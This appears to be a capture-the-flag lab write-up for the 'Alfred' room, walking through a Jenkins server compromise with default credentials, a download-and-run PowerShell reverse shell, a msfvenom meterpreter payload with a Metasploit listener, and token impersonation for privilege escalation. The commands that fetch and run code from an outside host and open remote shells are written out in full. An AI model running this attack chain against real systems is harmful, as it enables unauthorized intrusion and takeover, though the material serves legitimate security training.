# Alfred 

## Task1 

Port scanning
```bash
nmap -sC -sV --script vuln -oG alfred.md <Target_IP>
```

The Jetkins located at targetip:8080 and user and pass is admin. After login we go to the project> configuration>build and donwload nishang [Invoke-PowershellTcp](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1).

Open the tmux session and sepreate the terminal to two windows. The first one is running `python3 http.server` and the second one is running `nc -lnvp 9001`.

In build console section we need to type:

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.119.20:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.119.20 -Port 9001
```

After that we hit the build button and we gain access to the system.

## Task 2 

Generate renverse tcp for with the help of msfvenom

```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe

```

Jetkins build:

```powershell
powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"
```

Listener
```bash
use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run
```
This step uses the Metasploit handler to receive the incoming connection from your reverse shell. Once this is running, enter this command to start the reverse shell.

```
Start-Process "shell-name.exe"
```
## Taks 3 

Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).

This access token consists of:
- User SIDs(security identifier)
- Group SIDs
- Privileges

There are two types of access tokens:
- Primary access tokens: those associated with a user account that are generated on log on
- Impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

For an impersonation token, there are different levels:

- SecurityAnonymous: current user/client cannot impersonate another user/client
- SecurityIdentification: current user/client can get the identity and privileges of a client but cannot impersonate the client
- SecurityImpersonation: current user/client can impersonate the client's security context on the local system
- SecurityDelegation: current user/client can impersonate the client's security context on a remote system

Where the security context is a data structure that contains users' relevant security information.

The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:
- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

There's more reading [here](https://www.exploit-db.com/papers/42556).

To impersonate user tokens when successfully compromising a system we need to load incognito.

```bash
>load incognito
```
To check which tokens are available, enter the list_tokens -g. We can see that the BUILTIN\Administrators token is available.
```bash
>list_tokens -g
>impersonate_token "BUILTIN\Administrators"
>getuid -g
```

Even though you have a higher privileged token, you may not have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do).

Ensure that you migrate to a process with correct permissions (the above question's answer). The safest process to pick is the services.exe process. First, use the ps command to view processes and find the PID of the services.exe process. Migrate to this process using the command migrate PID-OF-PROCESS

```bash
>ps services.exe
>migrate <PID>
```
